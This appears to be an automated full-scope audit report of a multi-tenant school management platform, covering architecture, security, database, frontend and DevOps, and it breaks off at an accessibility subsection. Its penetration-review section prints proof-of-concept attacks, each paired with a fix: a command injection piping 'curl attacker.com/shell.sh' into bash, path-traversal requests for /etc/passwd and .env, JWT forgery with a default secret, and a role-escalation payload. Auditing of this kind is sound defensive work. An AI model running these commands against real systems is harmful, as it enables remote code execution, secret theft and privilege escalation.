# BASAER — FULL-SCOPE AUDIT REPORT

**Repository:** https://github.com/im-aderm/basaer  
**Date:** May 12, 2026  
**Auditor:** Opencode Automated Audit  
**Tech Stack:** Next.js 15 (Frontend) · NestJS (Backend) · PostgreSQL (Database) · Prisma (ORM)

---

# SECTION 1 — EXECUTIVE SUMMARY

## 1.1 Overall Architecture Evaluation

Basaer is a multi-tenant school management platform (SMB-ERP for schools) built as a monorepo with a Next.js frontend and NestJS backend communicating via REST API. The database layer uses Prisma with PostgreSQL. The architecture follows a modular domain-driven design with 35+ backend modules and 90+ frontend pages.

**Architecture strengths:** Clear module boundaries, httpOnly cookie auth, multi-tenant branch isolation via BranchGuard, Prisma as ORM (preventing raw SQL injection), centralized exception filter, global ValidationPipe with whitelist, Docker Compose deployment.

**Architecture weaknesses:** No shared types between frontend/backend (DTOs defined independently), inconsistent tenant isolation across modules, duplicate Paystack service implementations, no API versioning, permission system defined but never enforced, Phase 7 academic models missing Branch relations, WebSocket auth bypasses CORS policy.

## 1.2 Project Maturity Assessment

**Maturity: Late Alpha / Early Beta.** The platform has ~70% feature completeness for visible pages, but significant portions are placeholders, use hardcoded data, or have broken API integrations. Core business flows (student enrollment, attendance, finance, exams) are functional, but secondary modules (library, transport, comms, advanced settings) are incomplete. The security posture has critical gaps that must be addressed before any production deployment.

## 1.3 Scores

| Dimension                |       Score (0-10)        | Rationale                                                                                                 |
| ------------------------ | :-----------------------: | --------------------------------------------------------------------------------------------------------- |
| **Production Readiness** |          3.5/10           | Critical security holes, broken integrations, fake data in 4+ pages                                       |
| **Security**             |           3/10            | Hardcoded JWT fallback, command injection, path traversal, unauthenticated uploads, SSRF, mass assignment |
| **Scalability**          |           5/10            | Stateless API, but N+1 risks, Float money types, missing indexes, no caching strategy                     |
| **Maintainability**      |          5.5/10           | Good module structure, but 30+ string status fields, 15+ models missing branchId, duplicate services      |
| **Technical Debt**       | 6/10 (higher = more debt) | 19 broken API contracts, 7 placeholder pages, 4 fake-data pages, 30+ unenforced enums                     |

## 1.4 Main Blockers Before Production Deployment

1. **Hardcoded JWT secret fallback** — anyone can forge tokens
2. **Command injection in backup service** — RCE as database user
3. **Path traversal in backup download/delete** — arbitrary file read/delete
4. **Unauthenticated file upload endpoints** — storage abuse, malware risk
5. **Paystack webhook signature bypass** — payment fraud
6. **Mass assignment via `@Body() data: any`** — privilege escalation
7. **Multi-tenancy gaps** — 15+ models missing branchId, data leakage across branches
8. **Hardcoded default passwords** (student123, parent123, staff123) with no forced change
9. **No HTTPS configured** in nginx
10. **Float types for monetary fields** — financial calculation errors

## 1.5 Top 20 Critical Findings

| #   | Severity     | Finding                                                               | Location                                                               |
| --- | ------------ | --------------------------------------------------------------------- | ---------------------------------------------------------------------- |
| 1   | **CRITICAL** | Hardcoded JWT secret fallback `'default-jwt-secret-change-me'`        | `backend/src/auth/auth.module.ts:18`                                   |
| 2   | **CRITICAL** | Command injection via `pg_dump` in backup service                     | `backend/src/settings/backup.service.ts:31`                            |
| 3   | **CRITICAL** | Path traversal in backup download/delete                              | `backend/src/settings/backup.service.ts:65-79`                         |
| 4   | **CRITICAL** | Register endpoint accepts `@Body() data: any` — mass assignment       | `backend/src/auth/auth.controller.ts:108`                              |
| 5   | **CRITICAL** | `CreateStudentDto` has zero validation decorators                     | `backend/src/students/dto/create-student.dto.ts`                       |
| 6   | **CRITICAL** | Paystack webhook `JSON.stringify(req.body)` instead of raw body       | `backend/src/finance/payments.service.ts:76-78`                        |
| 7   | **CRITICAL** | Hardcoded default QR signing secret `'basaer-qr-default-secret-2026'` | `backend/src/attendance/qr.service.ts:12`                              |
| 8   | **HIGH**     | Unauthenticated upload endpoints (`@Public()`)                        | `backend/src/upload/upload.controller.ts:28,76`                        |
| 9   | **HIGH**     | Permissions system never enforced — only decorator-based              | `backend/src/permissions/permissions.service.ts`                       |
| 10  | **HIGH**     | Hardcoded default passwords with no forced change                     | `backend/src/students/students.service.ts:55`                          |
| 11  | **HIGH**     | 15+ Prisma models missing `branchId` — cross-tenant data leakage      | `prisma/schema.prisma` (Payroll, LeaveRequest, etc.)                   |
| 12  | **HIGH**     | 20+ monetary fields stored as `Float` — rounding errors               | `prisma/schema.prisma`                                                 |
| 13  | **HIGH**     | Frontend finance analytics fabricates 40/35/25% payment split         | `frontend/src/components/FinanceAnalytics.tsx:42-46`                   |
| 14  | **HIGH**     | Multi-step admission form has no step-level validation                | `frontend/src/components/admission/MultiStepAdmissionForm.tsx:127-133` |
| 15  | **HIGH**     | Login Log page shows entirely fake security data                      | `frontend/src/app/dashboard/settings/login-log/page.tsx`               |
| 16  | **HIGH**     | Google Meet webhook has no authentication/verification                | `backend/src/live-classes/meet-webhooks.controller.ts:31-33`           |
| 17  | **HIGH**     | 19 frontend-backend API contract mismatches (404s, wrong methods)     | See Section 6                                                          |
| 18  | **HIGH**     | WebSocket CORS set to `true` — allows all origins                     | `backend/src/realtime/realtime.gateway.ts:15`                          |
| 19  | **HIGH**     | SSRF via user-provided webhook URLs                                   | `backend/src/integrations/integrations.service.ts:125`                 |
| 20  | **HIGH**     | No HTTPS/TLS in nginx configuration                                   | `nginx/conf.d/default.conf`                                            |

---

# SECTION 2 — REPOSITORY STRUCTURE AUDIT

## 2.1 Folder Organization

```
basaer/
├── backend/           # NestJS API (35+ modules)
│   ├── prisma/         # Schema + 7 migrations
│   ├── src/            # Source code
│   │   ├── auth/       # Authentication & authorization
│   │   ├── common/     # Filters, guards, interceptors, middleware
│   │   ├── prisma/     # Prisma service + tenant helper
│   │   ├── students/   # Student management
│   │   ├── classes/     # Class/section management
│   │   ├── finance/    # Fees, invoices, payments
│   │   ├── attendance/  # Attendance + QR
│   │   ├── exams/      # Exam management (Phase 7)
│   │   ├── online-exams/ # Online exam system
│   │   ├── online-admission/ # Public admission
│   │   ├── employees/  # HR + payroll
│   │   ├── reporting/  # Report generation
│   │   ├── settings/   # System settings + backup
│   │   ├── upload/     # File upload (R2)
│   │   ├── realtime/   # Socket.io gateway
│   │   ├── live-classes/ # Google Meet integration
│   │   ├── integrations/ # Webhooks + API keys
│   │   └── ...30+ more modules
│   └── test/           # E2E + integration tests
├── frontend/          # Next.js 15 App Router
│   ├── src/
│   │   ├── app/        # ~115 pages (public + dashboard)
│   │   ├── components/ # 72+ components
│   │   ├── services/   # 30+ API service files
│   │   ├── context/    # AuthContext + Zustand stores
│   │   ├── hooks/      # useRealtime, useDebounce
│   │   ├── types/      # TypeScript types + Zod schemas
│   │   └── lib/        # api.ts, utils.ts, feature-flags.ts
│   └── e2e/           # Playwright E2E tests
├── packages/
│   └── shared-types/  # Shared TypeScript types (underutilized)
├── nginx/             # Reverse proxy config
├── docker-compose.yml # Multi-service deployment
└── package.json       # Monorepo root
```

## 2.2 Domain Boundaries & Coupling

**Strengths:**

- Clear module-per-domain structure in backend
- Frontend services mirror backend modules
- Feature flags for progressive rollout

**Weaknesses:**

- `shared-types` package exists but is not used by either frontend or backend
- Backend DTOs and frontend types are independently defined with no contract enforcement
- Services like `EmployeesService` directly access `this.prisma` for unrelated domains (awards, advance salary)
- Finance module has TWO separate Paystack implementations (`paystack.service.ts` and `payments.service.ts`)

## 2.3 Dead Code & Unused Modules

| Item                                                              | Type          | Evidence                                       |
| ----------------------------------------------------------------- | ------------- | ---------------------------------------------- |
| `packages/shared-types/`                                          | Dead package  | No imports from frontend or backend            |
| `backend/src/app.service.ts`                                      | Dead service  | Only returns `{ message: 'Hello API' }`        |
| `backend/src/app.controller.ts` newsletter                        | Dead endpoint | Logs email, never persists                     |
| `backend/src/employees/employees.controller.ts` `findAllTeachers` | Dead route    | Missing `@Get()` decorator                     |
| 46 backend endpoints                                              | Unused routes | No frontend service calls them (see Section 6) |
| `frontend/src/app/stitch_home.html`                               | Stray file    | Static HTML in app directory                   |
| `frontend/src/app/stitch_tahfeez.html`                            | Stray file    | Static HTML in app directory                   |

## 2.4 Duplicate Logic

- `PaystackService` and `PaymentsService` — duplicate Paystack integration with different webhook endpoints
- `AcademicsController.assignments` and `AssignmentsController` — duplicate assignment routes
- `TenantHelper.applyIsolation()` and `TenantScopedService.branchFilter()` — two different tenant isolation mechanisms with inconsistent behavior

---

# SECTION 3 — BACKEND AUDIT (NestJS)

## 3.1 API Design

### REST Consistency

- Most endpoints follow REST conventions
- Inconsistencies: `POST /employees/attendance/bulk` vs `POST /attendance/bulk-staff`, `PATCH /hostels/release` vs `POST /hostels/release`
- No API versioning — all routes under `/api/`
- Response format is inconsistent: some endpoints return `{ data, message }`, others return raw Prisma objects

### Pagination

- No standard pagination across endpoints. Some use `skip`/`take`, others return all results
- No total count metadata in list responses

### DTO Validation Gaps

| DTO                                     | Status              | Impact                                        |
| --------------------------------------- | ------------------- | --------------------------------------------- |
| `CreateStudentDto`                      | **ZERO decorators** | Any data accepted                             |
| `RecordPaymentDto`                      | **ZERO decorators** | Any data accepted, negative amounts possible  |
| `RegisterUserDto` (auth controller)     | **`any` type**      | Mass assignment risk — can set role, branchId |
| `CreateVoucherDto` (finance controller) | **`any` type**      | Bypasses defined DTO                          |
| `AwardsDTO`                             | **`any` type**      | No validation, no branch isolation            |

## 3.2 Business Logic

### Broken Workflows

| Workflow               | Issue                                                                                 | Location                                                         |
| ---------------------- | ------------------------------------------------------------------------------------- | ---------------------------------------------------------------- |
| Online exam start      | Uses `ctx.userId` but service expects `studentId` — always throws "Student not found" | `backend/src/online-exams/online-exams.controller.ts:140`        |
| Student deactivation   | 7 backend endpoints exist but NO frontend service calls them                          | Students controller deactivation routes                          |
| Branch isolation       | `EmployeesService.createAward()` has no branch check                                  | `backend/src/employees/employees.service.ts:160`                 |
| Paystack webhook       | `JSON.stringify(req.body)` ≠ raw body; signatures will intermittently fail            | `backend/src/finance/payments.service.ts:76-78`                  |
| Finance payment method | Records Paystack payments as `FLUTTERWAVE`                                            | `backend/src/finance/finance-payment.controller.ts:100`          |
| Online admission       | `@Public()` + `@GetTenantContext()` → `context` is undefined → TypeError              | `backend/src/online-admission/online-admission.controller.ts:38` |

### Race Conditions

- Student import processes in chunks of 50 with `setImmediate` yielding but no transaction wrapping — partial imports on failure
- No optimistic locking on invoice balance updates — concurrent payments could cause incorrect balances

## 3.3 Authentication & Authorization

### JWT Implementation

- Access tokens stored in httpOnly cookies (good)
- Refresh tokens stored in httpOnly cookies with 30-day expiry
- `bcrypt` with cost factor 10 for password hashing
- JWT configured with 7-day expiry for access tokens

### Critical Auth Issues

| Issue                         | Severity | Detail                                                               |
| ----------------------------- | -------- | -------------------------------------------------------------------- |
| Hardcoded JWT fallback        | CRITICAL | `auth.module.ts:18` — `'default-jwt-secret-change-me'`               |
| Bootstrap token timing attack | MEDIUM   | `auth.controller.ts:96` — uses `!==` not `crypto.timingSafeEqual`    |
| No forced password change     | HIGH     | Default passwords `student123`, `parent123`, `staff123` never expire |
| Reset token includes user ID  | MEDIUM   | Unnecessary IDOR vector in password reset                            |
| Upload endpoints `@Public()`  | HIGH     | No auth required to upload files                                     |
| Google Meet webhook           | HIGH     | No auth/verification on webhook                                      |

### RBAC Gaps

- Permissions table is seeded but **never enforced** by any guard or middleware
- Role-based access uses broad categories (SUPER_ADMIN, BRANCH_ADMIN, TEACHER) with no fine-grained permissions
- A BRANCH_ADMIN can perform any action within their branch regardless of configured permissions

### Privilege Escalation Risks

- `@Body() data: any` on register endpoint allows setting `role: 'SUPER_ADMIN'`
- Staff award creation has no branch check — any user can create awards for staff in other branches
- `/settings/backups/download/:filename` accessible to SUPER_ADMIN only, but path traversal allows reading any file

## 3.4 Database & Prisma

### Schema Quality

| Aspect        | Assessment                                                                       |
| ------------- | -------------------------------------------------------------------------------- |
| Relationships | Well-defined with proper `@relation` annotations                                 |
| Multi-tenancy | **15+ models missing `branchId`** — critical gap                                 |
| Indexes       | Good on high-traffic models (Attendance), missing on many others                 |
| Constraints   | Missing unique constraints on 10+ entities                                       |
| Cascading     | Inconsistent — only 5 relations use `onDelete: Cascade`                          |
| Audit fields  | Most models have `createdAt`/`updatedAt`, but **no `createdById`/`updatedById`** |
| Soft delete   | Only 9 models have `isActive`, core models (Student, Class) do not               |

### Critical Schema Issues

1. **20+ monetary fields use `Float`** — IEEE 754 rounding errors will cause financial discrepancies
2. **`GoogleMeetConfig` stores secrets in plaintext** — accessToken, clientSecret, apiKey unencrypted
3. **30+ string status fields that should be enums** — no type safety, invalid values possible
4. **Phase 7 models not in Branch relations** — Prisma won't generate reverse navigation
5. **`Staff` has no `branchId`** — relies on `User.branchId` for isolation, fragile
6. **`AssessmentRecord` has hardcoded columns** (`asgn1`, `asgn2`, etc.) conflicting with dynamic `AssessmentComponent` model

### N+1 Query Risks

- `TenantScopedService.findAll()` serial queries for count + data
- Branch model has 92 relation fields — `include: { branch: true }` is catastrophic
- Search service uses `contains` with `insensitive` mode — no trigram indexes

## 3.5 Security Findings (Detailed)

### Command Injection

```typescript
// backup.service.ts:31 — CRITICAL
await execPromise(`pg_dump "${dbUrl}" > "${filepath}"`);
// dbUrl from environment variable, but vulnerable if env is compromised
```

### Path Traversal

```typescript
// backup.service.ts:65-79 — HIGH
async deleteBackup(filename: string) {
  const filepath = path.join(this.backupDir, filename);
  // No path traversal check — attacker can send ../../etc/passwd
  fs.unlinkSync(filepath);
}
```

### Mass Assignment

```typescript
// auth.controller.ts:108 — CRITICAL
@Post('register')
async register(@Body() data: any) {
  return this.authService.register(data); // data.role = 'SUPER_ADMIN' is possible
}
```

### SSRF

```typescript
// integrations.service.ts:125 — HIGH
const response = await axios.post(endpoint.url, payload);
// endpoint.url is user-provided — can point to internal services
```

### Information Disclosure

- `AllExceptionsFilter` properly masks errors in production
- Login error is generic ("Invalid credentials") — good
- `console.log` logs user emails in newsletter endpoint

---

# SECTION 4 — FRONTEND AUDIT (Next.js)

## 4.1 UI/UX Consistency

### Positive Patterns

- Consistent Radix UI + Tailwind CSS component library via shadcn/ui
- Consistent color system using CSS variables
- Responsive layout with sidebar collapse

### Inconsistencies

| Issue                                                     | Location                                          | Impact                                          |
| --------------------------------------------------------- | ------------------------------------------------- | ----------------------------------------------- |
| Error pages use `bg-slate-900` instead of `bg-background` | `app/error.tsx`, `app/not-found.tsx`              | Dark theme forced regardless of user preference |
| Stray HTML files in app directory                         | `app/stitch_home.html`, `app/stitch_tahfeez.html` | Served as static files                          |
| Admin admission form uses raw HTML inputs                 | `dashboard/students/admission/page.tsx`           | Inconsistent with shadcn/ui everywhere else     |
| Transport dashboard shows fake stats                      | `dashboard/transport/page.tsx:157-166`            | Misleading operational data                     |
| Finance analytics fabricates data                         | `components/FinanceAnalytics.tsx:42-46`           | False reporting                                 |

## 4.2 Frontend/Backend Integration

### Broken API Contracts (19 mismatches)

| #   | Frontend Call                                     | Backend Route                         | Issue               |
| --- | ------------------------------------------------- | ------------------------------------- | ------------------- |
| 1   | `GET /exams/:id`                                  | `GET /exams/management/:id`           | Path mismatch       |
| 2   | `GET /hostels/vacancies`                          | No endpoint                           | 404                 |
| 3   | `GET /hostels/leaves`                             | `GET /hostels/leaves/branch`          | Missing `/branch`   |
| 4   | `PATCH /hostels/leaves/:id`                       | `PATCH /hostels/leaves/:id/status`    | Missing `/status`   |
| 5   | `GET /hostels/maintenance`                        | `GET /hostels/maintenance/branch`     | Missing `/branch`   |
| 6   | `PATCH /hostels/maintenance/:id`                  | No endpoint                           | 404                 |
| 7   | `GET /hostels/my-details`                         | No endpoint                           | 404                 |
| 8   | `GET /library/history/student/:id`                | No endpoint                           | 404                 |
| 9   | `GET /reporting/inventory`                        | No endpoint                           | 404                 |
| 10  | `GET /reporting/export/student-performance/pdf`   | `GET /reporting/export/performance`   | Path mismatch       |
| 11  | `GET /reporting/export/student-performance/excel` | No endpoint                           | 404                 |
| 12  | `GET /reporting/export/fees/pdf`                  | `GET /reporting/export/finance`       | Path mismatch       |
| 13  | `GET /reporting/export/fees/excel`                | No endpoint                           | 404                 |
| 14  | `GET /reporting/export/hr/pdf`                    | No endpoint                           | 404                 |
| 15  | `GET /reporting/export/inventory/pdf`             | No endpoint                           | 404                 |
| 16  | `PATCH /hostels/release/:id`                      | `POST /hostels/release/:allocationId` | Wrong method + path |
| 17  | `PATCH /library/return/:id`                       | `POST /library/return/:recordId`      | Wrong method + path |
| 18  | `GET /inventory/issues`                           | Only `POST /inventory/issues` exists  | Wrong method        |
| 19  | `POST /inventory/issue/return/:id`                | No endpoint                           | 404                 |

### Entire Backend Modules With No Frontend

| Module                         | Endpoints                                                | Frontend Service |
| ------------------------------ | -------------------------------------------------------- | ---------------- |
| Finance (full CRUD)            | Fee categories, structures, invoices, vouchers, cashflow | **None**         |
| Transport (full CRUD)          | Vehicles, routes, assignments                            | **None**         |
| Student deactivation           | 7 endpoints                                              | **None**         |
| Employee awards/advance salary | 7 endpoints                                              | **None**         |

## 4.3 State Management

- **AuthContext + Zustand** — duplication: token stored in both localStorage AND httpOnly cookie
- **Zustand admission store** — `resetForm()` clears to `{}` instead of default values
- **Socket connections never disconnected** — `useRealtime` cleanup function is empty
- **Blob URLs never revoked** — reporting service creates 8+ Object URLs that leak memory

## 4.4 Security Issues

| Issue                                                                       | Severity | Location                                             |
| --------------------------------------------------------------------------- | -------- | ---------------------------------------------------- |
| Token stored in localStorage                                                | HIGH     | `context/AuthContext.tsx:91`                         |
| Middleware only checks cookie existence                                     | HIGH     | `middleware.ts:4`                                    |
| ProtectedRoute allows unauthenticated through when `allowedRoles` undefined | HIGH     | `components/ProtectedRoute.tsx:27-48`                |
| Payment step hardcodes fake bank account `1234567890`                       | CRITICAL | `components/admission/steps/PaymentStep.tsx:153-177` |
| StudentIDCard hardcodes fake address and phone                              | HIGH     | `components/StudentIDCard.tsx:81,85,115`             |
| Reset password token in URL query params                                    | MEDIUM   | `app/reset-password/page.tsx:25-26`                  |
| API interceptor logs full error responses in production                     | LOW      | `lib/api.ts:14-23`                                   |

## 4.5 Missing Loading/Error/Empty States

- Only `dashboard/page.tsx` and `students/page.tsx` have explicit error states
- 90+ dashboard pages rely on global error boundary only
- No skeleton loaders for most data-fetching pages
- Empty states are generic "No data found" messages without actionable guidance

---

# SECTION 5 — FEATURE COMPLETENESS AUDIT

## Fully Implemented (Real API + Real Data)

Students, Finance (overview only), Attendance, Employees/HR, Transport (partial), Hostels, Academics, Exams, Online Exams, Live Classes, Reception, Cards, Branches, Events, Inventory, Settings (core)

## Fake/Simulated Pages (No Real Backend)

| Page                      | What's Fake                                                        |
| ------------------------- | ------------------------------------------------------------------ |
| Settings → Login Log      | Entire `mockLogs` array, date filter is `const matchesDate = true` |
| Settings → Custom Fields  | Local state only, no API calls, changes lost on refresh            |
| Settings → Student Fields | `setTimeout` simulates save, no persistence                        |
| Settings → System Update  | `setTimeout`/`setInterval` simulate entire update process          |

## Partially Fake Pages

| Page                 | What's Fake                                      |
| -------------------- | ------------------------------------------------ |
| Transport Dashboard  | "Logistics Summary" card has 4 hardcoded metrics |
| Bulk Comms           | Right panel (quotas, history) is fabricated      |
| Finance Analytics    | Payment method split is 40/35/25% hardcoded      |
| Dashboard → Students | "Recent Activity" shows 4 static text entries    |
| StudentIDCard        | Fake address, phone, expiry date                 |

## Placeholder Pages (RestorationPlaceholder)

Library (issued, manage, category), Certificates (generate-student), Alumni Events, Attachments (upload, type)

## Feature Flags Blocking Production Access

6 module flags default to `false`: Alumni, Reports, Bulk Comms, Library, QR Attendance, Advanced Settings. 16 sidebar items marked `isBeta: true`.

## TODO/FIXME Comments Remaining

1. `cards.service.ts:114` — `// TODO: Trigger parent notifications here in Phase 9`
2. `payments.service.ts:16` — `'sk_test_placeholder'` fallback comment

---

# SECTION 6 — API ↔ UI CONTRACT VALIDATION

## 6.1 Missing Endpoint Report

| Frontend Service                    | Expected Endpoint                  | Status      |
| ----------------------------------- | ---------------------------------- | ----------- |
| `hostelService.vacancies`           | `GET /hostels/vacancies`           | **Missing** |
| `hostelService.myDetails`           | `GET /hostels/my-details`          | **Missing** |
| `hostelService.updateMaintenance`   | `PATCH /hostels/maintenance/:id`   | **Missing** |
| `libraryService.getStudentHistory`  | `GET /library/history/student/:id` | **Missing** |
| `reportingService` (6 export paths) | Various PDF/Excel exports          | **Missing** |
| `inventoryService.getIssues`        | `GET /inventory/issues`            | **Missing** |

## 6.2 Unused Endpoint Report

46 backend endpoints have no frontend consumer, including:

- Entire Finance CRUD (fee-categories, fee-structures, invoices, vouchers, cashflow)
- Entire Transport CRUD (vehicles, routes, assignments)
- Student deactivation (6 endpoints)
- Employee awards/advance salary (7 endpoints)
- Exam Phase 7 management (approvals, publication, transcripts, GPA, ranking)
- Employee leave balances, my-awards
- Settings per-key retrieval

## 6.3 Broken Contract Report

See Section 4.2 table for the 19 mismatches.

---

# SECTION 7 — DATABASE & DATA MODEL REVIEW

## 7.1 Multi-Tenancy Isolation Gaps (CRITICAL)

**15+ models missing `branchId`** means cross-tenant data leakage:

| Model                     | Impact                                   |
| ------------------------- | ---------------------------------------- |
| `SalaryTemplate`          | Salary data visible across branches      |
| `Payroll`                 | Payroll records not isolated             |
| `LeaveRequest`            | Leave requests not filtered by branch    |
| `StaffAward`              | Awards not branch-scoped                 |
| `AdvanceSalary`           | Advance salary not branch-scoped         |
| `BorrowRecord`            | Library borrows not branch-scoped        |
| `HostelAllocation`        | Hostel allocations not branch-scoped     |
| `TransportAssignment`     | Transport not branch-scoped              |
| `Submission`              | Assignment submissions not branch-scoped |
| `BookCopy`                | Book copies not branch-scoped            |
| `BookReservation`         | Reservations not branch-scoped           |
| `HostelMaintenanceTicket` | Maintenance tickets not branch-scoped    |
| `TransportAttendance`     | Transport attendance not branch-scoped   |

## 7.2 Missing Indexes (Performance)

| Model          | Missing Index        | Query Impact                |
| -------------- | -------------------- | --------------------------- |
| `Notification` | `[userId, isRead]`   | Unread notification queries |
| `Invoice`      | `[branchId, status]` | Outstanding invoice queries |
| `Payment`      | `[branchId, status]` | Payment dashboard           |
| `LeaveRequest` | `[status]`           | Approval workflow           |
| `Message`      | `[isRead]`           | Unread message queries      |
| `Student`      | `[parentId]`         | Parent's children lookup    |
| `User`         | `[role, isActive]`   | User listing by role        |

## 7.3 Money Field Type Issues

All 20+ monetary fields use `Float` instead of `Decimal`:

- FeeStructure.amount, Invoice.totalAmount, Invoice.balance, InvoiceItem.amount, Payment.amount, LibraryFine.amount, SalaryTemplate.basicSalary, SalaryTemplate.netSalary, Payroll.amountPaid, AdvanceSalary.amount, InventoryProduct.costPrice, InventoryProduct.sellingPrice, InventoryPurchase.unitPrice, InventoryPurchase.totalPrice, InventorySale.unitPrice, InventorySale.totalPrice, Voucher.amount, AssessmentRecord scores

**Risk:** `0.1 + 0.2 !== 0.3` in IEEE 754. Financial reports will show pennies-off discrepancies that compound over thousands of records.

## 7.4 Recommended Schema Improvements

1. Convert all `Float` money fields to `Decimal`
2. Add `branchId` to all 15+ models missing it
3. Convert 30+ string status fields to Prisma enums
4. Add `createdById`/`updatedById` audit fields to all models
5. Add `deletedAt` soft-delete fields to core models (Student, Class, Section, Subject, Department)
6. Add Phase 7 model relations to Branch model
7. Add unique constraints: `[branchId, title]` on Book, `[branchId, name]` on Department
8. Create `AssessmentScore` junction table to replace hardcoded AssessmentRecord columns

---

# SECTION 8 — SECURITY PENETRATION REVIEW

## Exploitation Scenarios

### Scenario 1: JWT Token Forgery (CRITICAL)

**Exploit:** If `JWT_SECRET` env var is missing or empty, the app falls back to `'default-jwt-secret-change-me'`. An attacker can forge any JWT including `{role: 'SUPER_ADMIN'}`.

```typescript
// auth.module.ts:18
secret: configService.get<string>('JWT_SECRET') || 'default-jwt-secret-change-me',
// Attack:
const forgedToken = jwt.sign({ sub: 'attacker', role: 'SUPER_ADMIN' }, 'default-jwt-secret-change-me');
```

**Fix:** Use `configService.getOrThrow('JWT_SECRET')`. Remove fallback entirely.

### Scenario 2: Remote Code Execution via Backup (CRITICAL)

**Exploit:** If an attacker can influence the `DATABASE_URL` environment variable (e.g., via a server misconfiguration), they can inject shell commands:

```bash
DATABASE_URL="postgresql://user:pass@host -e 'curl attacker.com/shell.sh|bash' --host realhost/db"
pg_dump "$DATABASE_URL" > backup.sql
```

**Fix:** Use `child_process.execFile` with separate arguments. Never interpolate env vars into shell commands.

### Scenario 3: Arbitrary File Read/Delete via Path Traversal (HIGH)

**Exploit:** A SUPER_ADMIN can download or delete any file on the server:

```
GET /api/settings/backups/download/../../etc/passwd
DELETE /api/settings/backups/../../app/.env
```

**Fix:** Add `path.resolve` + `startsWith` check before file operations.

### Scenario 4: Privilege Escalation via Mass Assignment (CRITICAL)

**Exploit:** Send a POST to `/auth/register` with `role: 'SUPER_ADMIN'`:

```json
POST /auth/register
{ "email": "attacker@evil.com", "password": "pass", "role": "SUPER_ADMIN" }
```

**Fix:** Create a proper `RegisterUserDto` with `@IsEnum(UserRole)` and whitelisted fields.

### Scenario 5: Cross-Tenant Data Access (HIGH)

**Exploit:** A BRANCH_ADMIN from Branch A can query data from Branch B by:

1. Creating an employee award for staff in Branch B (no branch check)
2. Requesting advance salary for staff in another branch (no branch check)
3. Accessing BorrowRecords, HostelAllocations, TransportAssignments that lack `branchId`

### Scenario 6: Payment Fraud via Webhook Bypass (CRITICAL)

**Exploit:** The Paystack webhook verification uses `JSON.stringify(req.body)` instead of the raw request body. Due to JSON key ordering differences, legitimate webhooks will intermittently fail verification. More critically, an attacker can craft a payload with a specific key order that passes verification with the placeholder secret.
**Fix:** Use `req.rawBody` for signature verification. Remove placeholder secret fallback.

---

# SECTION 9 — PERFORMANCE & SCALABILITY REVIEW

## 9.1 Database Scalability

| Bottleneck                                        | At 1k Users           | At 10k Users       | At 100k Users                |
| ------------------------------------------------- | --------------------- | ------------------ | ---------------------------- |
| Missing indexes on Notification, Invoice, Payment | Slow queries (500ms+) | Very slow (5s+)    | Unusable (30s+)              |
| N+1 on tenant-scoped queries                      | Acceptable            | Sluggish           | Requires query rewrite       |
| Attendance table (7 indexes)                      | Acceptable            | Needs partitioning | Must partition by branchId   |
| No connection pooling config                      | Acceptable            | Slow under load    | Connection exhaustion        |
| Float math on financial data                      | Pennies off           | Dollars off        | Significant financial errors |

## 9.2 API Throughput Bottlenecks

- Global throttle of 100 req/min per IP — sufficient for normal use, insufficient for automated clients
- No caching layer (Redis exists for BullMQ but not used for response caching)
- Student import processes all rows sequentially with `setImmediate` yielding
- Reporting service generates PDFs synchronously on the API thread

## 9.3 Frontend Performance

- No lazy loading for dashboard routes — all pages bundled in initial JS
- ~90 console.log statements in frontend source (production)
- Blob URLs for file downloads never revoked (memory leaks)
- No React.memo on expensive components
- Socket.io connects per-component, not singleton (connection leak)

## 9.4 Scaling Roadmap

1. Add PostgreSQL connection pooling (pgBouncer or Prisma pooling)
2. Add Redis caching for frequently-accessed data (branches, sessions, settings)
3. Move report generation to background jobs (BullMQ queue already exists)
4. Add database indexes for Notification, Invoice, Payment, LeaveRequest
5. Convert Float money fields to Decimal
6. Implement cursor-based pagination for large datasets
7. Add CDN for static assets (Cloudflare R2 already configured)
8. Partition Attendance table by `branchId` + `date`

---

# SECTION 10 — DEVOPS & DEPLOYMENT AUDIT

## 10.1 Docker Configuration

**Strengths:**

- Multi-stage builds for both frontend and backend
- Non-root users (`appuser`, `nextjs`)
- Health checks configured
- Ports bound to `127.0.0.1` only

**Weaknesses:**

- No container resource limits (memory/CPU)
- No `read_only` filesystem flags
- No HTTPS in nginx config
- Default secrets in docker-compose.yml are weak placeholders

## 10.2 CI/CD

- GitHub Actions CI pipeline exists
- **CRITICAL:** `continue-on-error: true` on lint steps — lint failures never block PRs
- No frontend E2E tests in CI pipeline
- No security scanning (`npm audit`, Dependabot, Snyk)
- No coverage thresholds

## 10.3 Secrets Management

- Production `.env` file on disk with real credentials (not tracked but present)
- 4 hardcoded secret fallbacks in source code (JWT, QR, Paystack, Encryption Salt)
- `.env.example` properly uses `CHANGE_ME` placeholders
- No secrets rotation strategy

## 10.4 Monitoring & Logging

- NestJS `LoggingInterceptor` logs method, URL, status, response time, IP
- No structured logging (no JSON format for log aggregation)
- No APM integration (DataDog, New Relic, Sentry)
- No health check dashboard endpoint (only `/health` returns DB + Redis status)
- No metrics export (Prometheus, Grafana)

---

# SECTION 11 — CODE QUALITY AUDIT

## 11.1 SOLID Violations

- **Single Responsibility:** `EmployeesService` handles employees, awards, advance salary, payroll, leave — should be split
- **Open/Closed:** Adding new payment providers requires modifying existing finance module
- **Dependency Inversion:** `AppController` directly creates `new Redis(...)` instead of injecting Redis service

## 11.2 Code Smells

| Smell                       | Count                  | Examples                                                                                   |
| --------------------------- | ---------------------- | ------------------------------------------------------------------------------------------ |
| `any` type in controllers   | 5+                     | `register(@Body() data: any)`, `createAward(data: any)`, `createVoucher(@Body() dto: any)` |
| `console.log` in production | 8 backend, 90 frontend | Newsletter emails, webhook payloads                                                        |
| God service                 | 2                      | `EmployeesService`, `FinanceService`                                                       |
| Magic strings               | 30+                    | Status fields like `'ACTIVE'`, `'PENDING'`, `'BORROWED'`                                   |
| Duplicate service           | 1                      | `PaystackService` and `PaymentsService`                                                    |

## 11.3 Naming Inconsistencies

- Controller routes: `hostels/leaves/branch` vs `hostels/rooms/:id` vs `hostels/maintenance/branch`
- DTO naming: some use `Create*Dto`, others use plain objects
- File organization: some modules use subdirectories (dto/, entities/), others don't

---

# SECTION 12 — ACCESSIBILITY AUDIT

## 12.1 Keyboard Navigation

- Radix UI primitives provide keyboard support for dialogs, dropdowns, selects
- No visible focus indicators on custom-styled inputs
- Tab order is logical on most forms

## 12.2 Screen Reader Compatibility

- No `aria-live` regions for dynamic content updates
- Data tables lack `scope` attributes for header cells
- Form inputs generally have associated labels (good)
- Error messages not announced to screen readers

## 12.3 Color Contrast

